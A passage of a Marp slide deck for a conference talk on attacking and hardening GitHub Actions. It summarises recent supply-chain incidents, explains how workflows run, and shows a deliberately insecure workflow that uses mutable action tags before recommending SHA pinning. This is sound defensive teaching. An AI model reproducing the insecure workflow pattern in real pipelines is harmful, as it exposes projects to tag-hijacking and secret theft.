---
marp: true
author: Niek Palm
backgroundColor: #545860
color: white
class:
  - invert
  - lead
footer: '![h:106px](../../assets/shared/img/resources.png)'

theme:

style: |
  section {
    padding-top: 40px;
  }

  video::-webkit-media-controls {
    will-change: transform;
  }

  /* Common card styles */
  .card {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  }

  .card-dark {
    background: rgba(255, 255, 255, 0.15);
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  }

  /* Common flex layouts */
  .flex-center {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .flex-column {
    display: flex;
    flex-direction: column;
  }

  .flex-start {
    display: flex;
    align-items: flex-start;
  }

  /* Common grid layouts */
  .grid-2col {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1.5rem;
  }

  .grid-2x2 {
    display: grid;
    grid-template-columns: 1fr 1fr;
    grid-template-rows: 1fr 1fr;
    gap: 1.5rem;
  }

  /* Common image styles */
  .img-rounded {
    border-radius: 12px;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
  }

  /* Common text highlights */
  .highlight {
    color: #68D391;
    font-weight: bold;
  }

  .warning {
    color: #FEB2B2;
    font-weight: bold;
  }

  .grid-container {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    grid-template-rows: auto;
    gap: 1rem;
  }

  footer {
    position: absolute;
    bottom: 20px;
    right: 20px;
    left: auto;
    text-align: right;
  }
  
  footer img {
    max-height: 36px;
    width: auto;
  }
---


<!--
_backgroundColor: #4C1D95
_color: white
_footer: ''

-->

<style scoped>
h1 {
  text-align: right;
  font-size: 52px;
  color: #FFFFFF;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
  font-weight: 700;
}

h2 {
  font-size: 28px;
  text-align: right;
  font-style: italic;
  color: #FCD34D;
  text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
}

em {
  font-weight: bold;
  font-style: normal;
  color: #FCD34D;
}

p {
  font-style: italic;
  text-align: right;
  color: #E2E8F0;
}

strong {
    font-weight: bold;
    color: #FCD34D;
}

section.optional {
  display: none;
}

section.optional.enabled {
  display: block;
}

.conference-logo {
  position: absolute;
  bottom: 20px;
  right: 20px;
  font-size: 32px;
  z-index: 10;
  color: #FFFFFF;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
}

.conference-logo .ndc-text {
  font-weight: 700;
  letter-spacing: 2px;
}

.conference-logo .ndc-location {
  font-family: 'Courier New', Courier, monospace;
  font-weight: 400;
}
</style>

![bg left:40%](../../assets/shared/img/gh-actions-sec.png)

# <!-- fit --> Beyond the Commit
## Weaponizing and Hardening GitHub Actions

<br>
<br>

## Niek Palm

<div class="conference-logo">
  <span class="ndc-text">NDC</span> <span class="ndc-location">{ Security }</span>
</div>

<!-- Title slide — let it land, audience settles. -->

---

<!--
_backgroundColor: #1E3A8A
_color: white
_footer: ''
-->

<style scoped>
section {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  text-align: center;
}

h1 {
  font-size: 2.2rem;
  margin-bottom: 0.5rem;
  color: #DBEAFE;
}

.slides-info {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 1.2rem;
}

.qr-big {
  width: 320px;
  height: 320px;
  border-radius: 16px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
  background: white;
  padding: 12px;
}

.message {
  font-size: 1.3rem;
  color: #DBEAFE;
  max-width: 700px;
  line-height: 1.5;
}

.message em {
  color: #FCD34D;
  font-style: normal;
  font-weight: bold;
}

.hint {
  font-size: 0.85rem;
  color: #93C5FD;
  font-style: italic;
  margin-top: 0.2rem;
}
</style>

# 📷 Slides & Demos 📷

<div class="slides-info">
  <img src="../../assets/shared/img/resources.png" class="qr-big" alt="Slides QR Code" />
</div>

<!-- Let audience know slides are available. No rush to photograph. -->

---



<!--
_backgroundColor: #000000
_footer: ''

-->

<!-- 

_backgroundColor: #1E3A8A
_color: white
-->

<style scoped>
.speaker-container {
  display: flex;
  align-items: center;
  gap: 3rem;
  height: 80%;
  padding: 2rem;
}

.speaker-image {
  flex: 0 0 40%;
  display: flex;
  justify-content: center;
  align-items: center;
}

.speaker-photo {
  width: 400px;
  height: 400px;
  object-fit: cover;
  border-radius: 50%;
  box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4);
}

.speaker-info {
  flex: 1;
  display: flex;
  flex-direction: column;
  justify-content: center;
  gap: 1.5rem;
}

.speaker-name {
  font-size: 3.5rem;
  font-weight: bold;
  color: #DBEAFE;
  margin: 0;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
}

.speaker-title {
  font-size: 1.4rem;
  color: #93C5FD;
  margin: 0;
  font-weight: 300;
  font-style: italic;
}

footer img {
  max-height: 100px;
  width: auto;
}
</style>


<div class="speaker-container">
  <div class="speaker-image">
    <img src="../../assets/shared/img/niek.jpg" class="speaker-photo" alt="Niek Palm" />
  </div>
  
  <div class="speaker-info">
    <h1 class="speaker-name">Niek Palm</h1>
    <h2 class="speaker-title">Principal Engineer Philips</h2>
  </div>
</div>

<!-- Brief intro: name, Philips, why CI/CD security matters to you. Don't linger. -->

---

<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.supply-chain-container {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  gap: 2rem;
  height: 85%;
  align-items: start;
  padding: 1rem;
}

.chain-visual {
  display: flex;
  justify-content: center;
  align-items: start;
  height: 100%;
}

.chain-image {
  width: 100%;
  max-width: 100%;
  object-fit: contain;
  border-radius: 12px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.chain-content {
  display: flex;
  flex-direction: column;
}

.stat-box {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 1.2rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.stat-box h3 {
  margin: 0 0 0.7rem 0;
  color: #FEF3C7;
  font-size: 0.9rem;
}

.stat-box ul {
  margin: 0;
  padding-left: 1.3rem;
  font-size: 0.65rem;
  line-height: 1.8;
  color: #FEE2E2;
}

.stat-box strong {
  color: #FECACA;
  font-weight: bold;
}

.highlight-danger {
  color: #FCA5A5;
  font-weight: bold;
}
</style>

# 🔗 Software Supply Chain

<div class="supply-chain-container">
  <div class="chain-visual">
    <img src="../../assets/shared/img/ssc.png" class="chain-image" alt="Software Supply Chain" />
  </div>
  
  <div class="chain-content">
    <div class="stat-box">
      <h3>⚠️ Why It's a Prime Target</h3>
      <ul>
        <li><strong>Compromise once</strong>, deploy everywhere</li>
        <li><strong>Massive multiplier effect</strong></li>
        <li><strong>Trusted relationships</strong> exploited</li>
        <li><strong>Hard to detect</strong> before it's too late</li>
      </ul>
    </div>
  </div>
</div>

<!-- Compromise once, deploy everywhere. The multiplier effect is what makes SSC attacks devastating. -->

---

<!--
_backgroundColor: #4C1D95
_color: white
-->

<style scoped>
.attacks-container {
  display: flex;
  flex-direction: column;
  gap: 1rem;
  height: 85%;
  padding: 0.5rem;
}

.intro-box {
  text-align: center;
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 0.6rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.intro-box p {
  margin: 0;
  font-size: 0.75rem;
  color: #FEE2E2;
  font-style: italic;
}

.attacks-grid {
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 1rem;
  flex: 1;
}

.attack-card {
  background: rgba(0, 0, 0, 0.3);
  border-radius: 10px;
  padding: 0.8rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.attack-header {
  display: flex;
  align-items: center;
  gap: 0.5rem;
  padding-bottom: 0.3rem;
}

.attack-emoji {
  font-size: 1.4rem;
  flex-shrink: 0;
}

.attack-title {
  font-size: 0.75rem;
  font-weight: bold;
  color: #FEF3C7;
  margin: 0;
}

.attack-details {
  flex: 1;
}

.attack-detail {
  font-size: 0.6rem;
  color: #FEE2E2;
  margin: 0.3rem 0;
  line-height: 1.3;
}

.attack-year {
  font-size: 0.55rem;
  color: #FCA5A5;
  font-style: italic;
  margin: 0;
}

.attack-impact {
  background: rgba(239, 68, 68, 0.2);
  border-radius: 6px;
  padding: 0.4rem;
  margin-top: 0.3rem;
}

.impact-label {
  font-size: 0.55rem;
  font-weight: bold;
  color: #FECACA;
  margin: 0 0 0.2rem 0;
}

.impact-text {
  font-size: 0.58rem;
  color: #FEE2E2;
  margin: 0;
  line-height: 1.2;
}

.stat-highlight {
  color: #FCA5A5;
  font-weight: bold;
}
</style>


<!--


🐴 XZ Utils (2024)
What Happened:
A contributor "Jia Tan" spent 2+ years gaining maintainer trust on the xz compression library, then injected a sophisticated backdoor targeting OpenSSH authentication. The backdoor would have compromised virtually every Linux server. Caught by Andres Freund who noticed a 500ms SSH login slowdown.

Key Lesson:
Trust is the ultimate attack vector. Social engineering over years can bypass every technical control. Open source maintainer burnout creates opportunities for patient attackers. Verify contributors, not just code.

⚡ tj-actions/changed-files (2025)
What Happened:
Compromised maintainer bot token, manipulated git tags to point to malicious commits. 23,000+ repos using @latest tags automatically pulled and executed malicious code that stole their CI secrets.

Key Lesson:
Never use floating tags (@latest, @main, @v1) in production. Always pin GitHub Actions to specific commit SHAs. Floating tags = uncontrolled automatic updates = potential automatic compromise.

🎭 S1ngularity - Nx (2025)
What Happened:
Exploited pull_request_target injection to steal npm token, published malicious Nx packages, which were then auto-installed by AI coding tools (Cursor, Cline), exfiltrating secrets from thousands of developer machines and CI environments.

Key Lesson:
pull_request_target gives untrusted code write access - extremely dangerous. AI tools amplify attack scale by auto-installing packages. One vulnerable workflow + package registry access = mass compromise at machine speed.

🪱 Shai-Hulud 2.0 (2025)
What Happened:
Massive npm supply-chain campaign compromising 700+ packages from major projects (Zapier, ENS Domains, PostHog, Postman). Preinstall malware executed during npm install, exfiltrating secrets and tokens across dev machines and CI/CD pipelines. Attack spread rapidly at ~1,000 new repos every 30 minutes, affecting 25,000+ GitHub repositories across ~500 users. Stolen data was cross-published, meaning victim credentials appeared in unaffiliated GitHub accounts.

Key Lesson:
Preinstall hooks can execute before your code even runs - widening attack surface to both dev and CI/CD environments. The scale and automation of modern supply chain attacks is unprecedented. With 27% of cloud environments potentially exposed, even popular, trusted packages can be weaponized. Immediate investigation required for npm-based environments.

Meta-lesson across all four:
Supply chain attacks exploit trust and automation. The things that make development fast (auto-updates, trusted dependencies, CI/CD automation) become attack vectors when compromised. Defense requires: pin versions, minimize trust, verify everything, and monitor the entire dependency chain.

-->

# 💥 Supply Chain Attacks in the Wild

<div class="attacks-container">
  <div class="attacks-grid">
    <div class="attack-card">
      <div class="attack-header">
        <span class="attack-emoji">&#x1F40E;</span>
        <div>
          <h3 class="attack-title">XZ Utils Backdoor</h3>
          <p class="attack-year">2024</p>
        </div>
      </div>
      <div class="attack-details">
        <p class="attack-detail">A contributor spent 2+ years gaining maintainer trust, then injected a backdoor targeting OpenSSH on every Linux server. Caught by a developer who noticed a 500ms SSH slowdown</p>
      </div>
    </div>
    <div class="attack-card">
      <div class="attack-header">
        <span class="attack-emoji">⚡</span>
        <div>
          <h3 class="attack-title">tj-actions/changed-files</h3>
          <p class="attack-year">2025</p>
        </div>
      </div>
      <div class="attack-details">
        <p class="attack-detail">Attackers compromised maintainer bot token, manipulated version tags to point to malicious commits, exfiltrating CI/CD secrets from 23,000+ repositories using this popular GitHub Action</p>
      </div>
    </div>
    <div class="attack-card">
      <div class="attack-header">
        <span class="attack-emoji">🎭</span>
        <div>
          <h3 class="attack-title">S1ngularity (Nx)</h3>
          <p class="attack-year">2025</p>
        </div>
      </div>
      <div class="attack-details">
        <p class="attack-detail">Exploited pull_request_target injection to steal npm token, published malicious Nx packages, weaponized AI tools for secrets exfiltration, exposed 1000s of secrets and private repos</p>
      </div>
    </div>
    <div class="attack-card">
      <div class="attack-header">
        <span class="attack-emoji">🪱</span>
        <div>
          <h3 class="attack-title">Shai-Hulud 2.0</h3>
          <p class="attack-year">2025</p>
        </div>
      </div>
      <div class="attack-details">
        <p class="attack-detail">Massive npm supply-chain campaign compromising 700+ packages from Zapier, PostHog, Postman. Preinstall malware exfiltrated secrets across 25,000+ GitHub repos, spreading at 1,000 repos per 30 minutes</p>
      </div>
    </div>
  </div>
</div>

<!-- Walk through all 4 briefly. Don't deep-dive — you revisit tj-actions, S1ngularity, and Shai-Hulud later. Transition: "These attacks all targeted CI/CD." -->

---
<!--
_backgroundColor: #00629F
_color: white
-->

<style scoped>
.slide-container {
  display: flex;
  align-items: flex-start;
  gap: 1.5rem;
  height: 100%;
}

.left-section {
  flex: 0 0 450px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.gh-actions-img {
  width: 450px;
  height: 450px;
  object-fit: cover;
  border-radius: 20px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
  background: rgba(255, 255, 255, 0.1);
  backdrop-filter: blur(10px);
}

.right-section {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
}

.right-section p {
  padding: 1.2rem;
  font-size: 1.15rem;
  line-height: 1.5;
  font-style: italic;
  word-wrap: break-word;
  hyphens: auto;
  color: white;
}


</style>

# 🤖 What is GitHub Actions?

<div class="slide-container">
  <div class="left-section">
    <img src="../../assets/shared/img/gh-actions.png" class="gh-actions-img" />
  </div>
  
  <div class="right-section">
    <p>"GitHub Actions automates your software development workflow, letting you build, test, and deploy code directly from your GitHub repository. Its tight integration with GitHub has made it one of the most widely adopted CI/CD solutions."</p>
  </div>
</div>

<!-- Quick level-set. Most audience knows Actions — just framing. -->

---
<!--
_backgroundColor: #00629F
_color: white
-->

<style scoped>
.slide-container {
  display: flex;
  align-items: flex-start;
  gap: 1rem;
  height: 100%;
}


.left-section {
  flex: 0 0 450px;
  display: flex;
  align-items: center;
  justify-content: center;
}

.gh-actions-img {
  width: 450px;
  height: 450px;
  object-fit: cover;
  border-radius: 20px;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
  background: rgba(255, 255, 255, 0.1);
  backdrop-filter: blur(10px);
}

.right-section {
  flex: 1;
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: 1.0rem;
}

.column h2 {
  font-size: 1.5rem;
  margin-bottom: 0.5rem;
}

.column ul {
  margin: 0;
  padding-left: 1rem;
}

.column li {
  margin-bottom: 0.3rem;
  font-size: 0.85rem;
}
</style>

# 🤖 What is GitHub Actions?

<div class="slide-container">
  <div class="left-section">
    <img src="../../assets/shared/img/gh-actions.png" class="gh-actions-img" />
  </div>
  
  <div class="right-section">
    <div class="column">
      <h3>🏃‍♂️ <strong>Runners</strong></h3>
      <ul>
        <li>GitHub-hosted or self-hosted</li>
        <li>Multiple OS support (Linux, Windows, macOS)</li>
      </ul>
    </div>
    <div class="column">
      <h3>🚀 <strong>Jobs &amp; Steps</strong></h3>
      <ul>
        <li><strong>Jobs</strong>: Isolation level - independent units</li>
        <li><strong>Steps</strong>: Individual tasks within a job</li>
        <li>Run sequentially or in parallel</li>
      </ul>
    </div>
  </div>
</div>

<!-- Jobs = isolation boundary. Steps share runner environment — that matters for security. -->

---
<!--
_backgroundColor: #00629F
_color: white
-->

<style scoped>
.example-container {
  display: flex;
  align-items: flex-start;
  gap: 1rem;
  height: 100%;
}

.code-section {
  flex: 0 0 50%;
}

.code-section pre {
  border-radius: 12px;
  box-shadow: 10px 10px 20px rgba(0, 0, 0, 0.3);
  padding: 1.5rem;
  margin: 0;
}

.explanation-section {
  flex: 1;
}

.explanation-section h3 {
  font-size: 1.3rem;
  margin-bottom: 1rem;
}

.explanation-section ol {
  font-size: 0.8rem;
  line-height: 1.9;
}
</style>

# ⚙️ Example workflow

<div class="example-container">
  <div class="code-section">

```yaml
name: GitHub Actions Example

on: [push, pull_request]                           # 1

jobs:
  build:
    runs-on: [ubuntu-latest]                       # 2
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v5                    # 3
        
    - name: Install dependencies
      run: npm ci                                  # 4
      
    - name: Run tests
      run: npm test                                # 4
```

  </div>
  
  <div class="explanation-section">
    <h3>🔍 <strong>What's happening?</strong></h3>
    <ol>
      <li><strong>Trigger</strong>: on <code>push</code> or <code>pull_request</code></li>
      <li><strong>Runner</strong>: GitHub hosted fleet<br><code>ubuntu-latest</code></li>
      <li><strong>Third party action</strong>: <code>checkout@v5</code></li>
      <li><strong>Run script</strong>: <code>npm ...</code></li>
    </ol>
  </div>
</div>

<!-- Walk through 4 elements. Highlight: checkout@v5 is a trust decision — a third-party action running in your context. -->

---

<!--
_backgroundColor: #00629F
_color: white
-->

<style scoped>
.four-block-container {
  height: 80%;
  padding: 1rem;
}

.block {
  padding: 1.0rem;
}

.block h3 {
  margin-top: 0;
  margin-bottom: 0.2;
  color: #68D391;
  font-size: 1.0rem;
}

.block ul {
  margin: 0;
  padding-left: 1.2rem;
  flex-grow: 1;
}

.block li {
  margin-bottom: 0.5rem;
  line-height: 1.2;
  font-size: 0.6rem;
}

code {
  background: rgba(0, 0, 0, 0.3);
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
}
</style>

# 🧱 What is a GitHub Action?

<div class="four-block-container grid-2x2">
  
  <div class="block card flex-column">
    <h3>🧱 LEGO Bricks in Your Pipeline</h3>
    <ul>
      <li>Building blocks you snap together</li>
      <li>Each action does one thing well</li>
      <li>Combine them to build complex workflows</li>
    </ul>
  </div>

  <div class="block card flex-column">
    <h3>⚡ Available Runtimes</h3>
    <ul>
      <li><strong>Node.js</strong> - JavaScript actions</li>
      <li><strong>Docker</strong> - Containerized actions</li>
      <li><strong>Shell</strong> - Composite run steps</li>
    </ul>
  </div>

  <div class="block card flex-column">
    <h3>🎯 Run in Context of a Job</h3>
    <ul>
      <li>Actions execute as steps within jobs</li>
      <li>Share the same runner environment</li>
      <li>Access job-level variables and secrets</li>
    </ul>
  </div>

  <div class="block card flex-column">
    <h3>📦 Distribution Channel</h3>
    <ul>
      <li><strong>GitHub Repository or Package</strong> - Distribution method</li>
      <li>Reference: <code>owner/repo@version</code></li>
      <li>Can be public or private</li>
    </ul>
  </div>

</div>

<!-- LEGO bricks: building blocks. Key point: actions run IN your job context — they get your secrets, tokens, and runner. -->

---

<!--
_backgroundColor: #00629F
_color: white
-->

<style scoped>
.usecases-container {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
  height: 85%;
  padding: 1rem;
}

.intro-text {
  text-align: center;
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 0.8rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}

.intro-text p {
  margin: 0;
  font-size: 0.8rem;
  color: #F3E8FF;
  font-style: italic;
}

.usecases-grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 0.3rem;
  align-content: start;
}

.usecase-card {
  padding: 0.2rem 0.1rem 0.2rem 0.8rem;
  gap: 0.8rem;
  height: 2.0rem;
  display: flex;
  align-items: center;
  justify-content: flex-start;
}

.usecase-emoji {
  font-size: 1.0rem;
  flex-shrink: 0;
  line-height: 1.0;
}

.usecase-text {
  font-size: 0.45rem;
  font-weight: bold;
  color: #F7FAFC;
  margin: 0;
  padding: 0;
  line-height: 1;
}
</style>

# 🚀 Actions Everywhere
*From development to deployment - GitHub Actions powers our entire software lifecycle*
<div class="usecases-container">

  
  <div class="usecases-grid">
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🏗️</span>
      <p class="usecase-text">Build & compile code</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🐳</span>
      <p class="usecase-text">Build containers</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🧪</span>
      <p class="usecase-text">Run unit tests</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🎭</span>
      <p class="usecase-text">Run E2E tests</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">🛡️</span>
      <p class="usecase-text">Security scanning</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">🔍</span>
      <p class="usecase-text">Code quality checks</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">📦</span>
      <p class="usecase-text">Publish packages</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">☁️</span>
      <p class="usecase-text">Deploy to cloud</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">🔄</span>
      <p class="usecase-text">Manage infrastructure</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">🚀</span>
      <p class="usecase-text">Release automation</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">📚</span>
      <p class="usecase-text">Generate docs</p>
    </div>
    <div class="usecase-card card-dark flex-center">
      <span class="usecase-emoji">🌐</span>
      <p class="usecase-text">Deploy static sites</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🔄</span>
      <p class="usecase-text">Update dependencies</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🏷️</span>
      <p class="usecase-text">Tag & version</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🤖</span>
      <p class="usecase-text">Automate workflows</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">📊</span>
      <p class="usecase-text">Generate reports</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">📧</span>
      <p class="usecase-text">Send notifications</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🔐</span>
      <p class="usecase-text">Manage secrets</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🎯</span>
      <p class="usecase-text">Issue triage</p>
    </div>
    <div class="usecase-card card-dark">
      <span class="usecase-emoji">🌍</span>
      <p class="usecase-text">Multi-platform builds</p>
    </div>
  </div>
</div>

<!-- Quick scan of the grid. Actions touch everything. Transition: "So what happens when they get compromised?" -->

---

<!-- ==================== PART 1: WEAPONIZE ==================== -->

<!--
_backgroundColor: #000000
_color: white
_footer: ''
-->

<style scoped>
section {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f23 100%);
}

h1 {
  font-size: 5rem;
  text-align: center;
  margin: 0;
  background: linear-gradient(90deg, #DC2626, #F97316, #FBBF24);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  text-shadow: none;
  font-weight: 800;
  letter-spacing: 0.1em;
}

.subtitle {
  font-size: 1.3rem;
  color: #94A3B8;
  margin-top: 1.5rem;
  font-style: italic;
}

.icon-row {
  display: flex;
  gap: 2rem;
  margin-top: 2rem;
  font-size: 2.5rem;
}

.part-badge {
  position: absolute;
  top: 40px;
  left: 40px;
  background: rgba(220, 38, 38, 0.3);
  border: 2px solid #DC2626;
  color: #F87171;
  padding: 0.5rem 1.2rem;
  border-radius: 8px;
  font-size: 0.8rem;
  font-weight: bold;
  letter-spacing: 0.15em;
}
</style>

<div class="part-badge">PART 1</div>

# WEAPONIZE

<div class="subtitle">Understanding the attack surface</div>

<div class="icon-row">
  <span>💉</span>
  <span>🎯</span>
  <span>🔓</span>
  <span>💥</span>
</div>

<!-- Transition slide — pause briefly, advance. -->

---

<!--
_backgroundColor: #4C1D95
_color: white
-->

<style scoped>
.attack-target-container {
  display: flex;
  align-items: center;
  gap: 3rem;
  height: 80%;
  padding: 2rem;
}

.target-image {
  flex: 0 0 45%;
  display: flex;
  justify-content: center;
  align-items: center;
}

.target-image img {
  width: 500px;
  height: 500px;
  object-fit: cover;
  border-radius: 50%;
  clip-path: circle(50%);
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.target-content {
  flex: 1;
}

.target-list {
  list-style: none;
  padding: 0;
  margin: 0;
}

.target-list li {
  font-size: 1.2rem;
  line-height: 2.5;
}

.target-list li strong {
  color: #F3E8FF;
}
</style>

# 🎯 Why target GitHub Actions?

<div class="attack-target-container">
  <div class="target-image">
    <img src="../../assets/shared/img/gh-attack-vectors.png" alt="GitHub Actions Target" />
  </div>
  
  <div class="target-content">
    <ul class="target-list">
      <li><strong>📂 Source Code Access</strong></li>
      <li><strong>📦 Publishing Packages</strong></li>
      <li><strong>🔐 Secrets & Credentials</strong></li>
    </ul>
  </div>
</div>

<!-- Three reasons: source code access, package publishing, secrets. Pipelines are the nexus of all three. -->

---

<!--
_backgroundColor: #B91C1C
_color: white
-->

<style scoped>
pre {
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}
</style>

# 🤔 What can go wrong?


```yaml
name: Check Changed Files

on: [pull_request]

jobs:
  check-changes:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    - name: Get changed files
      uses: tj-actions/changed-files@v45
      id: changed-files
      with:
        files: |
          src/**
          docs/**
    
    - name: Process changes
      run: echo "Changed files: ${{ steps.changed-files.outputs.all_changed_files }}"
```

<!-- Ask: "What's wrong here?" Uses @v45 — a mutable tag. -->

---

<!--
_backgroundColor: #B91C1C
_color: white
-->

<style scoped>
pre {
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}
</style>

# 🔥 What can go wrong?


```yaml
name: Check Changed Files

on: [pull_request]

jobs:
  check-changes:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4.0.0
    
    - name: Get changed files
      uses: tj-actions/changed-files@v45.0.7
      id: changed-files
      with:
        files: |
          src/**
          docs/**
    
    - name: Process changes
      run: echo "Changed files: ${{ steps.changed-files.outputs.all_changed_files }}"
```

<!-- Even pinned to @v45.0.7 it's still a tag, not a SHA. Tags can be moved — exactly what happened in the tj-actions attack. -->

---

<!--
_backgroundColor: #DC2626
_color: white
-->

<style scoped>
.attack-container {
  display: grid;
  grid-template-columns: 2fr 3fr;
  gap: 2rem;
  height: 80%;
  align-items: center;
}

.attack-content {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.attack-point {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 1.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.attack-point p {
  margin: 0;
  font-size: 1.1rem;
  line-height: 3.22;
}

.attack-image {
  display: flex;
  justify-content: center;
  align-items: center;
}

.attack-image img {
  max-width: 100%;
  max-height: 100%;
  object-fit: contain;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  border-radius: 12px;

}
</style>

# 🎯 Repository takeover

<div class="attack-container">
  <div class="attack-point">
      <p>🚀 Push Malicious Code<p>
      <p>✨ Create Releases</p>
      <p>🏷️ Rewrite Tags</p>
  </div>

  
  <div class="attack-image">
    <img src="../../assets/shared/img/tj-actions-attack.png" alt="Repository Takeover Attack" />
  </div>
</div>

<!-- Compromised bot PAT → tag overwritten → 23k repos auto-pulled malicious code. If you control the tag, you control downstream. -->

---

<!--
_backgroundColor: #059669
_color: white
-->

<style scoped>
.solution-container {
  display: grid;
  grid-template-columns: 2fr 3fr;
  gap: 2rem;
  height: 80%;
  align-items: center;
}

.solution-content {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.solution-point {
  background: rgba(255, 255, 255, 0.15);
  border-radius: 12px;
  padding: 1.5rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.solution-point h4 {
  margin: 0 0 0.8rem 0;
  color: #F0FDF4;
  font-size: 0.85rem;
  line-height: 2.2;
}

.solution-code {
  display: flex;
  justify-content: center;
  align-items: center;
}

.solution-code pre {
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  padding: 1.5rem;
  margin: 0;
  width: 100%;
}
</style>

# ✅ Secure third-party actions

<div class="solution-container">
  <div class="solution-content">
    <div class="solution-point">
      <h4>🔒 Lock SHA</h4>
      <h4>🔍 Verify Integrity</h4>
      <h4>🤖 Manage with Dependabot</h4>
      <h4>🛡️ Minimal Privilege</h4>
    </div>
  </div>
  
  <div class="solution-code">

```yaml
name: Secure Workflow

on: [pull_request]

jobs:
  secure-build:
    runs-on: ubuntu-latest
    steps:
      # SHA-pinned action for security
    - uses: actions/checkout@08c690...      # v5.0.0 ← SECURE
    
    - name: Get changed files
      # SHA-pinned action for security
      uses: tj-actions/changed-files@24d32f... # v47 ← SECURE
      
    - name: Process changes
      ...
```

  </div>
</div>

<!-- Solution: pin to SHA, enable Dependabot for automated updates, verify integrity. Key takeaway for audience. -->

---

<!--
_backgroundColor: #4C1D95
_color: white
-->

<style scoped>
.trust-container {
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
  height: 85%;
  padding: 1rem;
}

.intro-box {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 1rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  text-align: center;
}

.intro-box p {
  margin: 0;
  font-size: 0.9rem;
  color: #FCD34D;
  font-weight: bold;
}

.trust-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1.5rem;
  flex: 1;
}

.trust-section {
  background: rgba(255, 255, 255, 0.1);
  border-radius: 12px;
  padding: 1.2rem;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
  display: flex;
  flex-direction: column;
  gap: 0.8rem;
}

.trust-section h3 {
  margin: 0 0 0.5rem 0;
  color: #A78BFA;
  font-size: 1.2rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.trust-section ul {
  margin: 0;
  padding-left: 1.5rem;
  font-size: 0.65rem;
  line-height: 1.6;
  color: #E2E8F0;
}

